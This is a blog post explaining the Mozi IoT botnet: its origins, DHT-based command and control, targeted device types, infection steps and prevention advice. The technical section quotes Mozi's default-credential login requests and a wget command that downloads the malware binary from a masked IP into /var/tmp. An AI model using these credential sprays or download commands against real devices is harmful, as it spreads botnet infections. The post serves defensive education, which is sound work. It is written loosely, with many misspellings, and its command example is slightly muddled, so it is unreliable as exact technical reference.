---
title: What is mozi malware and how it works?
date: 2024-06-08 15:39:12
tags: ["malware", "mozi", "technical"]
---

# What is Mozi Malware

The common defination is that Mozi is a IoT botnet, that makes use of P2P for communiacating and reuses source code of other well-known malware families, including
Gafgyt, Mirai and IoT Reaper. The possible victims are that not configured IoT devices based on security perspective such as network gateways, digital video records (DVRs) and IP cameras. It works by exploiting `weak telnet passwords` and unpatched IoT `vulnerabilites`. After gaining access to the victim device, it tries to get Mozi malware from infected spreaders using `Wget` command. We'll look at techinal details later. For now lets look at the history and capabilities of that shit Malware.

## History of Mozi

First discovered **in late 2019**, Mozi has evolved significantly over time, demonstrating sophisticated capabilities and resilience. Mozi was initially identified by researchers from Netlab 360 in late 2019. It stood out due to its use of a Distributed Hash Table (DHT) for command-and-control (C2) communication, a technique borrowed from peer-to-peer (P2P) networks like BitTorrent. This approach allowed Mozi to maintain a decentralized infrastructure, making it difficult to disrupt. If we look at the purpose of this malware, we can simply list like this;

- Conduct DDoS attacks
- Data exfiltration
- Command or payload execution
- MITM attacks via HTTP Hijacking and DNS spoofing
- Stealing data

As a nature of this malware, it aims to deliver itself to IoT devices that covers also routers and edge routers. When a router get infected, you can make any kind of network attacks. Because of that reason, it is very dangereous. Possible victim lists are;

- Consumer IoT: Home-based devices, such as security cameras, lighting control, appliances, etc.
- Commercial IoT: Devices designed for use in various industries. For instance, healthcare has internet-connected pacemakers and monitors. The transportation and construction industries use devices associated with vehicle trackers, telematics, logistic and supply chain systems and building information modeling.
- Enterprise IoT: Devices designed for use in offices, such as projectors, routers, security systems and digital advertising.
- The Industrial IoT: Industrial control systems, production line automation systems, logic controllers and aircraft systems.
- Infrastructure IoT: Smart city management systems, traffic control devices, utility monitoring devices, etc.
- Internet of Military Things: Wearable combat biometrics devices, robots and surveillance equipment.
- OT/ICS infrastructure.

Here is the killchain of `Mozi malware`

{% asset_img Mozi-attack-flow.png %}

## How Mozi Malware Works? (Technical Details)

What if we download mozi malware from urlhaus or threatfox, you can see the type of this malwares mostly `ELF 32-bit MSB executable, MIPS, MIPS-I version 1` or `ARM` version of this. They gets downloaded from random node who already infected in botnet network. One infected Mozi bot (maybe router or camera) scans the network to find possible victims by sending HTTP requests to comman urls that used from possible IoT devices. Maybe it searchs for vulnerabilities that gives power to comprimise the device. Patterns for HTTP request that made from Mozi bot are that;

- /boaform/admin/formLogin?username=user&psd=user
- /boaform/admin/formLogin?username=admin&psd=admin
- /boaform/admin/formLogin?username=adminisp&psd=adminisp
- /boaform/admin/formLogin?username=ec8&psd=ec8

If it can access possible victim using this credantials, it trys to download Mozi malware itself using `wget` command that is a powerful utility for non-interactive downloading of files from the web. The comman pattern to test victim is vulnerable for CMDi attacks for delivering malware is that `wget http://xxx.xx.xxx.xxx/bins/mozi.a -o /var/tmp/mozi.a; chmod 777 /var/tmp/mozi.a; rm -rf /var/tmp/mozi.a`

After that malware gets downloaded and executed. Once executed, the `binary forks` many versions of itself renamed as ‘ssh’ or ‘dropbear’. The forked processes are responsible for setting up the DHT communications and closing ports to prevent infection by other malware. The forked processes can also set up HTTP on a randomly chosen port to host the Mozi binary.

{% asset_img mozi-architecture.png %}

## Technical Mitigation Strategies

To effectively protect against `Mozi` malware, you can follow below advices. Here are detailed technical advices:

### Prevention
- Strengthen Authentication:
  - Enforce strong, unique passwords for all IoT devices. Avoid using default credentials.
  - Implement multi-factor authentication (MFA) where possible.
- Firmware and Software Updates:
  - Regularly update firmware and software on all IoT devices to patch known vulnerabilities.
  - Enable automatic updates if the option is available.
- Network Segmentation:
  - Isolate IoT devices from critical network segments to limit the impact of a potential compromise.
  - Use VLANs (Virtual Local Area Networks) and firewalls to control traffic between network segments.
- Disable Unnecessary Services:
  - Turn off unused services and protocols on IoT devices to reduce attack surfaces.


See you in next blog.
